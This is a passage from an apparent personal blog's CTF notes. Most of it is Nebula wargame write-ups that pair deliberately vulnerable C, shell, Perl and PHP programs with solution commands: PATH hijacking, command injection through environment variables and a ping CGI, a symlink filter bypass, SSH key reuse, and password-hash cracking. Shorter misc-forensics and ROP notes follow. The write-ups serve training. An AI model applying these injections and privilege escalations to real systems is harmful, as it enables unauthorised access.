title=\"Nebula Writeup\"></a>Nebula Writeup</h1><h2 id=\"level00\"><a href=\"#level00\" class=\"headerlink\" title=\"level00\"></a>level00</h2><h3 id=\"About\"><a href=\"#About\" class=\"headerlink\" title=\"About\"></a>About</h3><p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>\n<p>Alternatively, look at the find man page.</p>\n<p>To access this level, log in as level00 with the password of level00.</p>\n<h3 id=\"Key-Points\"><a href=\"#Key-Points\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li>find</li>\n<li>uid</li>\n</ul>\n<h3 id=\"Writeup\"><a href=\"#Writeup\" class=\"headerlink\" title=\"Writeup\"></a>Writeup</h3><ul>\n<li>Step 1</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level00@nebula:~$ id flag00</div><div class=\"line\">uid=999(flag00) gid=999(flag00) groups=999(flag00)</div></pre></td></tr></table></figure>\n<ul>\n<li>Step 2</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level00@nebula:~$ find / -uid 999 2&gt;/dev/null</div><div class=\"line\">/bin/.../flag00</div><div class=\"line\">/home/flag00</div><div class=\"line\">/home/flag00/.bash_logout</div><div class=\"line\">/home/flag00/.bashrc</div><div class=\"line\">/home/flag00/.profile</div><div class=\"line\">/rofs/bin/.../flag00</div><div class=\"line\">/rofs/home/flag00</div><div class=\"line\">/rofs/home/flag00/.bash_logout</div><div class=\"line\">/rofs/home/flag00/.bashrc</div><div class=\"line\">/rofs/home/flag00/.profile</div></pre></td></tr></table></figure>\n<ul>\n<li>Step 3</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level00@nebula:~$ /bin/.../flag00 </div><div class=\"line\">Congrats, now run getflag to get your flag!</div><div class=\"line\">flag00@nebula:~$ getflag</div><div class=\"line\">You have successfully executed getflag on a target account</div></pre></td></tr></table></figure>\n<h2 id=\"level-01\"><a href=\"#level-01\" class=\"headerlink\" title=\"level 01\"></a>level 01</h2><h3 id=\"About-1\"><a href=\"#About-1\" class=\"headerlink\" title=\"About\"></a>About</h3><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>\n<p>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>\n<h3 id=\"SourceCode\"><a href=\"#SourceCode\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">char</span> **envp)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">gid_t</span> gid;</div><div class=\"line\">  <span class=\"keyword\">uid_t</span> uid;</div><div class=\"line\">  gid = getegid();</div><div class=\"line\">  uid = geteuid();</div><div class=\"line\"></div><div class=\"line\">  setresgid(gid, gid, gid);</div><div class=\"line\">  setresuid(uid, uid, uid);</div><div class=\"line\"></div><div class=\"line\">  system(<span class=\"string\">\"/usr/bin/env echo and now what?\"</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"Key-Points-1\"><a href=\"#Key-Points-1\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li><code>env</code></li>\n<li><a href=\"http://www.linuxidc.com/Linux/2015-01/111459.htm\" target=\"_blank\" rel=\"external\">修改环境变量</a></li>\n</ul>\n<h3 id=\"Writeup-1\"><a href=\"#Writeup-1\" class=\"headerlink\" title=\"Writeup\"></a>Writeup</h3><ul>\n<li>Step 1</li>\n</ul>\n<p><code>level01@nebula:~$ ln -s /bin/getflag  echo</code></p>\n<ul>\n<li>Step 2 </li>\n</ul>\n<p><code>level01@nebula:~$ export PATH=/home/level01:$PATH</code></p>\n<ul>\n<li>Step 3</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level01@nebula:~$ ../flag01/flag01 </div><div class=\"line\">You have successfully executed getflag on a target account</div></pre></td></tr></table></figure>\n<h2 id=\"level02\"><a href=\"#level02\" class=\"headerlink\" title=\"level02\"></a>level02</h2><h3 id=\"About-2\"><a href=\"#About-2\" class=\"headerlink\" title=\"About\"></a>About</h3><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>\n<p>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>\n<h3 id=\"SourceCode-1\"><a href=\"#SourceCode-1\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">char</span> **envp)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> *buffer;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">gid_t</span> gid;</div><div class=\"line\">  <span class=\"keyword\">uid_t</span> uid;</div><div class=\"line\"></div><div class=\"line\">  gid = getegid();</div><div class=\"line\">  uid = geteuid();</div><div class=\"line\"></div><div class=\"line\">  setresgid(gid, gid, gid);</div><div class=\"line\">  setresuid(uid, uid, uid);</div><div class=\"line\"></div><div class=\"line\">  buffer = <span class=\"literal\">NULL</span>;</div><div class=\"line\"></div><div class=\"line\">  asprintf(&amp;buffer, <span class=\"string\">\"/bin/echo %s is cool\"</span>, getenv(<span class=\"string\">\"USER\"</span>));</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"about to call system(\\\"%s\\\")\\n\"</span>, buffer);</div><div class=\"line\">  </div><div class=\"line\">  system(buffer);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"Key-Points-2\"><a href=\"#Key-Points-2\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li>环境变量</li>\n</ul>\n<h3 id=\"Writeups\"><a href=\"#Writeups\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><ul>\n<li>Step 1</li>\n</ul>\n<p><code>level02@nebula:~$ export USER=&quot;&amp;&amp; /bin/getflag&quot;</code></p>\n<h2 id=\"level03\"><a href=\"#level03\" class=\"headerlink\" title=\"level03\"></a>level03</h2><h3 id=\"About-3\"><a href=\"#About-3\" class=\"headerlink\" title=\"About\"></a>About</h3><p>Check the home directory of flag03 and take note of the files there.</p>\n<p>There is a crontab that is called every couple of minutes.</p>\n<p>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>\n<h3 id=\"SourceCode-2\"><a href=\"#SourceCode-2\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/sh</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> /home/flag03/writable.d/* ; <span class=\"keyword\">do</span></div><div class=\"line\">    (<span class=\"built_in\">ulimit</span> -t 5; bash -x <span class=\"string\">\"<span class=\"variable\">$i</span>\"</span>)</div><div class=\"line\">    rm -f <span class=\"string\">\"<span class=\"variable\">$i</span>\"</span></div><div class=\"line\"><span class=\"keyword\">done</span></div></pre></td></tr></table></figure>\n<h3 id=\"Key-Points-3\"><a href=\"#Key-Points-3\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li><a href=\"http://www.jb51.net/LINUXjishu/151805.html\" target=\"_blank\" rel=\"external\">Crontab</a></li>\n<li>shell脚本</li>\n</ul>\n<h3 id=\"Writeups-1\"><a href=\"#Writeups-1\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><ul>\n<li><code>/home/flag03/writable.d</code> 下建一个可执行脚本</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level03@nebula:/home/flag03/writable.d$ echo \"/bin/getflag &gt; /tmp/flag\" &gt; test.sh</div></pre></td></tr></table></figure>\n<p>PS:</p>\n<ul>\n<li><code>sudo ls /var/spool/cron/crontabs</code></li>\n</ul>\n<h2 id=\"level04\"><a href=\"#level04\" class=\"headerlink\" title=\"level04\"></a>level04</h2><h3 id=\"About-4\"><a href=\"#About-4\" class=\"headerlink\" title=\"About\"></a>About</h3><p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>\n<p>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.</p>\n<h3 id=\"SourceCode-3\"><a href=\"#SourceCode-3\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">char</span> **envp)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> buf[<span class=\"number\">1024</span>];</div><div class=\"line\">  <span class=\"keyword\">int</span> fd, rc;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span>(argc == <span class=\"number\">1</span>) &#123;</div><div class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"%s [file to read]\\n\"</span>, argv[<span class=\"number\">0</span>]);</div><div class=\"line\">      <span class=\"built_in\">exit</span>(EXIT_FAILURE);</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"built_in\">strstr</span>(argv[<span class=\"number\">1</span>], <span class=\"string\">\"token\"</span>) != <span class=\"literal\">NULL</span>) &#123;</div><div class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"You may not access '%s'\\n\"</span>, argv[<span class=\"number\">1</span>]);</div><div class=\"line\">      <span class=\"built_in\">exit</span>(EXIT_FAILURE);</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  fd = open(argv[<span class=\"number\">1</span>], O_RDONLY);</div><div class=\"line\">  <span class=\"keyword\">if</span>(fd == <span class=\"number\">-1</span>) &#123;</div><div class=\"line\">      err(EXIT_FAILURE, <span class=\"string\">\"Unable to open %s\"</span>, argv[<span class=\"number\">1</span>]);</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  rc = read(fd, buf, <span class=\"keyword\">sizeof</span>(buf));</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"keyword\">if</span>(rc == <span class=\"number\">-1</span>) &#123;</div><div class=\"line\">      err(EXIT_FAILURE, <span class=\"string\">\"Unable to read fd %d\"</span>, fd);</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  write(<span class=\"number\">1</span>, buf, rc);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"Key-Points-4\"><a href=\"#Key-Points-4\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li><code>strstr</code></li>\n</ul>\n<h3 id=\"Writeups-2\"><a href=\"#Writeups-2\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><ul>\n<li>Step 1</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level04@nebula:/tmp$ ln -s /home/flag04/token flag04</div><div class=\"line\">level04@nebula:/tmp$ /home/flag04/flag04 /tmp/flag04</div><div class=\"line\">06508b5e-8909-4f38-b630-fdb148a848a2</div></pre></td></tr></table></figure>\n<ul>\n<li>Step 2</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">nebula@nebula:~$ su flag04</div><div class=\"line\">Password: </div><div class=\"line\">sh-4.2$ getflag</div><div class=\"line\">You have successfully executed getflag on a target account</div></pre></td></tr></table></figure>\n<h2 id=\"level05\"><a href=\"#level05\" class=\"headerlink\" title=\"level05\"></a>level05</h2><h3 id=\"About-5\"><a href=\"#About-5\" class=\"headerlink\" title=\"About\"></a>About</h3><p>Check the flag05 home directory. You are looking for weak directory permissions</p>\n<p>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>\n<h3 id=\"Key-Points-5\"><a href=\"#Key-Points-5\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li>ssh </li>\n</ul>\n<h3 id=\"Writeups-3\"><a href=\"#Writeups-3\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><ul>\n<li>Step 1</li>\n</ul>\n<p><code>level05@nebula:/home/flag05/.backup$ tar xvf backup-19072011.tgz -C /tmp/</code></p>\n<ul>\n<li>Step 2</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level05@nebula:~$ cp -r /tmp/.ssh/ ~</div><div class=\"line\">level05@nebula:~$ ssh flag05@localhost</div></pre></td></tr></table></figure>\n<h2 id=\"level06\"><a href=\"#level06\" class=\"headerlink\" title=\"level06\"></a>level06</h2><h3 id=\"About-6\"><a href=\"#About-6\" class=\"headerlink\" title=\"About\"></a>About</h3><p>The flag06 account credentials came from a legacy unix system.</p>\n<p>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p>\n<h3 id=\"Key-Points-6\"><a href=\"#Key-Points-6\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><h3 id=\"Witeups\"><a href=\"#Witeups\" class=\"headerlink\" title=\"Witeups\"></a>Witeups</h3><ul>\n<li>Step 1</li>\n</ul>\n<p>copy出<code>/etc/passwd</code>文件    </p>\n<ul>\n<li>Step 2</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">➜  Desktop john passwd </div><div class=\"line\">Using default input encoding: UTF-8</div><div class=\"line\">Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16])</div><div class=\"line\">Press 'q' or Ctrl-C to abort, almost any other key for status</div><div class=\"line\">hello            (flag06)</div><div class=\"line\">1g 0:00:00:00 DONE 2/3 (2017-06-25 15:41) 25.00g/s 18750p/s 18750c/s 18750C/s 123456..marley</div><div class=\"line\">Use the \"--show\" option to display all of the cracked passwords reliably</div><div class=\"line\">Session completed</div></pre></td></tr></table></figure>\n<h2 id=\"level07\"><a href=\"#level07\" class=\"headerlink\" title=\"level07\"></a>level07</h2><h3 id=\"About-7\"><a href=\"#About-7\" class=\"headerlink\" title=\"About\"></a>About</h3><p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>\n<p>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>\n<h3 id=\"SourceCode-4\"><a href=\"#SourceCode-4\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight perl\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/perl</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">use</span> CGI <span class=\"string\">qw&#123;param&#125;</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Content-type: text/html\\n\\n\"</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">ping</span> </span>&#123;</div><div class=\"line\">  $host = $_[<span class=\"number\">0</span>];</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">print</span>(<span class=\"string\">\"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;\"</span>);</div><div class=\"line\"></div><div class=\"line\">  @output = <span class=\"string\">`ping -c 3 $host 2&gt;&amp;1`</span>;</div><div class=\"line\">  <span class=\"keyword\">foreach</span> $line (@output) &#123; <span class=\"keyword\">print</span> <span class=\"string\">\"$line\"</span>; &#125;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">print</span>(<span class=\"string\">\"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;\"</span>);</div><div class=\"line\">  </div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># check if Host set. if not, display normal page, etc</span></div><div class=\"line\"></div><div class=\"line\">ping(param(<span class=\"string\">\"Host\"</span>))</div></pre></td></tr></table></figure>\n<h3 id=\"Key-Points-7\"><a href=\"#Key-Points-7\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><h3 id=\"Writeups-4\"><a href=\"#Writeups-4\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><p><code>127.0.0.1;getflag</code></p>\n<h2 id=\"level08\"><a href=\"#level08\" class=\"headerlink\" title=\"level08\"></a>level08</h2><h3 id=\"About-8\"><a href=\"#About-8\" class=\"headerlink\" title=\"About\"></a>About</h3><p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>\n<p>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p>\n<h3 id=\"key-Points\"><a href=\"#key-Points\" class=\"headerlink\" title=\"key Points\"></a>key Points</h3><p><code>7f</code> –&gt; <code>del</code></p>\n<h3 id=\"Writeups-5\"><a href=\"#Writeups-5\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">000000D5  01                                               .</div><div class=\"line\">000000D6  00 0d 0a 50 61 73 73 77  6f 72 64 3a 20          ...Passw ord:</div><div class=\"line\">000000B9  62                                               b</div><div class=\"line\">000000BA  61                                               a</div><div class=\"line\">000000BB  63                                               c</div><div class=\"line\">000000BC  6b                                               k</div><div class=\"line\">000000BD  64                                               d</div><div class=\"line\">000000BE  6f                                               o</div><div class=\"line\">000000BF  6f                                               o</div><div class=\"line\">000000C0  72                                               r</div><div class=\"line\">000000C1  7f                                               .</div><div class=\"line\">000000C2  7f                                               .</div><div class=\"line\">000000C3  7f                                               .</div><div class=\"line\">000000C4  30                                               0</div><div class=\"line\">000000C5  30                                               0</div><div class=\"line\">000000C6  52                                               R</div><div class=\"line\">000000C7  6d                                               m</div><div class=\"line\">000000C8  38                                               8</div><div class=\"line\">000000C9  7f                                               .</div><div class=\"line\">000000CA  61                                               a</div><div class=\"line\">000000CB  74                                               t</div><div class=\"line\">000000CC  65                                               e</div><div class=\"line\">000000CD  0d                                               .</div></pre></td></tr></table></figure>\n<p>Password is <strong>backd00Rmate</strong></p>\n<h2 id=\"level09\"><a href=\"#level09\" class=\"headerlink\" title=\"level09\"></a>level09</h2><h3 id=\"ABout\"><a href=\"#ABout\" class=\"headerlink\" title=\"ABout\"></a>ABout</h3><p>There’s a C setuid wrapper for some vulnerable PHP code…</p>\n<p>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.</p>\n<h3 id=\"SourceCode-5\"><a href=\"#SourceCode-5\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">spam</span><span class=\"params\">($email)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  $email = preg_replace(<span class=\"string\">\"/\\./\"</span>, <span class=\"string\">\" dot \"</span>, $email);</div><div class=\"line\">  $email = preg_replace(<span class=\"string\">\"/@/\"</span>, <span class=\"string\">\" AT \"</span>, $email);</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"keyword\">return</span> $email;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">markup</span><span class=\"params\">($filename, $use_me)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  $contents = file_get_contents($filename);</div><div class=\"line\"></div><div class=\"line\">  $contents = preg_replace(<span class=\"string\">\"/(\\[email (.*)\\])/e\"</span>, <span class=\"string\">\"spam(\\\"\\\\2\\\")\"</span>, $contents);</div><div class=\"line\">  $contents = preg_replace(<span class=\"string\">\"/\\[/\"</span>, <span class=\"string\">\"&lt;\"</span>, $contents);</div><div class=\"line\">  $contents = preg_replace(<span class=\"string\">\"/\\]/\"</span>, <span class=\"string\">\"&gt;\"</span>, $contents);</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">return</span> $contents;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">$output = markup($argv[<span class=\"number\">1</span>], $argv[<span class=\"number\">2</span>]);</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> $output;</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"key-Points-1\"><a href=\"#key-Points-1\" class=\"headerlink\" title=\"key  Points\"></a>key  Points</h3>","categories":["CTF","Writeup"],"tags":["Pwn"]},{"title":"Routine Training:Misc","url":"https://xuccc.github.io/CTF/Writeup/RoutineTraining-Misc/","content":"<h2 id=\"Break-In-2017\"><a href=\"#Break-In-2017\" class=\"headerlink\" title=\"Break In 2017\"></a>Break In 2017</h2><h3 id=\"Mysterious-GIF\"><a href=\"#Mysterious-GIF\" class=\"headerlink\" title=\"Mysterious GIF\"></a>Mysterious GIF</h3><ul>\n<li>Step 1</li>\n</ul>\n<p><code>binwalk</code> 发现有额外数据</p>\n<p>继续对<code>temp.zip</code>文件进行<code>binwalk</code>，发现有大量<code>zip</code></p>\n<p>解压出来是一堆加密过的文件</p>\n<ul>\n<li>Step 2</li>\n</ul>\n<p>继续分析gif文件，发现每一帧文件的metadata出有异常数据，尝试进行提取</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">$</span> identify -format \"%s %c \\n\" Question.gif </div><div class=\"line\">0 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172</div><div class=\"line\">...</div><div class=\"line\">24 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f</div></pre></td></tr></table></figure>\n<ul>\n<li>Step 3</li>\n</ul>\n<p>base64 解码得到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><div class=\"line\">MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDdMNbL5qVWiCQr</div><div class=\"line\">X2w69q/7y3ShIPueptxfAwRQbROre30c6Uw/oK8weZTx44m0ALouhV46KcQJkhrq</div><div class=\"line\">...</div><div class=\"line\">HKw5C+fwAXlFItm09aEVTXw+xzLJb2Sr6gATPWM5qVaubxfsb5mXH/wD9iCLhJSo</div><div class=\"line\">rK0RHZktPbEs5ytDsqBHd5PFFw==</div></pre></td></tr></table></figure>\n<p>猜测为公玥文件</p>\n<ul>\n<li>Step 4</li>\n</ul>\n<p>对由<code>temp.zip</code>得到的一堆文件进行解密</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">$</span>openssl rsautl -decrypt -inkey ../key -in partaa.enc </div><div class=\"line\">JFIFC</div></pre></td></tr></table></figure>\n<p>有第一份文件解密结果猜测此为一个完整的Jpg文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">$</span> for i in `ls`</div><div class=\"line\"><span class=\"meta\">&gt;</span>&gt; do</div><div class=\"line\"><span class=\"meta\">&gt;</span>&gt; openssl rsautl -decrypt -inkey ../key  -in $i &gt;&gt; flag.jpg</div><div class=\"line\"><span class=\"meta\">&gt;</span>&gt; done</div></pre></td></tr></table></figure>\n<h2 id=\"AlexCTF-2017\"><a href=\"#AlexCTF-2017\" class=\"headerlink\" title=\"AlexCTF-2017\"></a>AlexCTF-2017</h2><h3 id=\"USB-probing\"><a href=\"#USB-probing\" class=\"headerlink\" title=\"USB probing\"></a>USB probing</h3><ul>\n<li>Step 1</li>\n</ul>\n<p><code>binwalk</code> 发现存在<code>png</code></p>\n<ul>\n<li>Step 2</li>\n</ul>\n<p>分析协议后使用<code>tshark</code>进行提取</p>\n<p><code>tshark -r Usb-probing.pcap -T fields -e usb.capdata|tr -d &#39;:&#39;|tr -d &#39;\\n&#39;|grep &quot;8950\\w*&quot; -o &gt; raw</code></p>\n<ul>\n<li>Step 3</li>\n</ul>\n<p>还原为png图片</p>\n<p><code>xxd -p -r raw png</code></p>\n<p><img src=\"/CTF/Writeup/RoutineTraining-Misc/Usb Probing\" alt=\"Usb Probing\"></p>\n","categories":["CTF","Writeup"],"tags":["Misc"]},{"title":"栈溢出","url":"https://xuccc.github.io/CTF/Pwn/栈溢出/","content":"<h2 id=\"ROP\"><a href=\"#ROP\" class=\"headerlink\" title=\"ROP\"></a>ROP</h2><h3 id=\"Ret2Text\"><a href=\"#Ret2Text\" class=\"headerlink\" title=\"Ret2Text\"></a>Ret2Text</h3><p>ret2text即需要我们控制程序执行程序本身已有的的代码(.text)<br><a name=\"%E9%A2%98%E7%9B%AE\"></a></p>\n<h4 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h4><ul>\n<li><a href=\"https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-1\" target=\"_blank\" rel=\"external\">pico-ctf-2013:rop-1</a></li>\n<li><a href=\"https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-2\" target=\"_blank\" rel=\"external\">pico-ctf-2013:rop-2</a></li>\n<li><a href=\"/CTF/Writeup/RoutineTraining-Pwn/#Pwnme200\">湖湘杯-2016：Pwnme</a></li>\n</ul>\n<h3 id=\"Ret2ShellCode\"><a href=\"#Ret2ShellCode\" class=\"headerlink\" title=\"Ret2ShellCode\"></a>Ret2ShellCode</h3><p>ret2shellcode需要我们控制程序执行shellcode代码。</p>\n<h3 id=\"Ret2SysCall\"><a href=\"#Ret2SysCall\" class=\"headerlink\" title=\"Ret2SysCall\"></a>Ret2SysCall</h3><h4 id=\"理论\"><a href=\"#理论\" class=\"headerlink\" title=\"理论\"></a>理论</h4><p>ret2syscall需要我们控制程序执行系统调用，获取shell  </p>\n<p>系统调用执行条件: </p>\n<ul>\n<li>把系统调用的编号存入 EAX  </li>\n<li>把函数参数存入其它通用寄存器  </li>\n<li>触发 0x80 号中断（int 0x80）  </li>\n</ul>\n<p>例如：</p>\n<p>执行<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p>\n<p>X86下</p>\n<ul>\n<li>系统调用号即eax应该为0xb</li>\n<li>第一个参数即ebx应该指向/bin/sh的地址</li>\n<li>第二个参数即ecx应该为0</li>\n<li>第三个参数edx应该为0</li>\n</ul>\n<h4 id=\"相关题目\"><a href=\"#相关题目\" class=\"headerlink\" title=\"相关题目\"></a>相关题目</h4><ul>\n<li><a href=\"http://vancir.com/posts/ret2syscall%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B\" target=\"_blank\" 